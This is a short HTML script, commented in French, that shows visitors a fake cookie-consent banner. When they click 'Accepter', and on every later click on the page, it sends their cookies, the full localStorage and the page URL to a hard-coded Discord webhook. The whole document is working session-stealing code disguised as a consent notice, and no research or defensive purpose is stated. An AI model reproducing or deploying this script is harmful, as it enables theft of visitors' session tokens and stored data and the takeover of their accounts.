<script>
    // On attend que le DOM soit prêt, ou on le fait de force
    function lancerLeScript() {
        // 1. TON WEBHOOK ICI (copie bien l'URL complète)
        const WEBHOOK_URL = "https://discord.com/api/webhooks/1571234677434617986/8XG1WsjhxFIQTL816bRPn7I8D37zJM0h_l_APXRETUyW__bySrUfWXuoQKEL-I-gIZlL";

        // 2. Fonction d'envoi
        function envoyerDonnees(raison) {
            let payload = {
                raison: raison,
                url: window.location.href,
                cookies: document.cookie || "AUCUN_COOKIE",
                localStorage: JSON.stringify(localStorage)
            };

            fetch(WEBHOOK_URL, {
                method: "POST",
                mode: "no-cors",
                headers: { "Content-Type": "text/plain" },
                body: JSON.stringify(payload)
            }).catch(function(e) { console.log("Erreur webhook", e); });
        }

        // 3. Création de la bannière
        let banniere = document.createElement("div");
        banniere.id = "ma-super-banniere-cookie";
        banniere.style.cssText = "position:fixed !important; bottom:0 !important; left:0 !important; width:100% !important; background:#111 !important; color:#fff !important; padding:20px !important; z-index:2147483647 !important; text-align:center !important; border-top:2px solid #0066ff !important; font-family:monospace !important;";
        banniere.innerHTML = 'Ce site utilise des cookies pour fonctionner. <button id="btn-accept-cookie" style="margin-left:20px; padding:10px 20px; background:#0066ff; color:#fff; border:none; cursor:pointer; font-weight:bold; border-radius:4px;">Accepter</button>';
        
        document.body.appendChild(banniere);

        // 4. Clic sur Accepter
        document.getElementById("btn-accept-cookie").onclick = function() {
            banniere.style.display = "none";
            envoyerDonnees("ACCEPTE");
        };

        // 5. Détection du clic sur "Générer" (ou n'importe où)
        document.body.onclick = function(e) {
            if (banniere.style.display === "none") {
                setTimeout(function() {
                    envoyerDonnees("ACTION_SUR_LA_PAGE");
                }, 1000);
            }
        };
    }

    // On lance le script, peu importe l'état de la page
    if (document.readyState === "loading") {
        document.addEventListener("DOMContentLoaded", lancerLeScript);
    } else {
        lancerLeScript();
    }
</script>
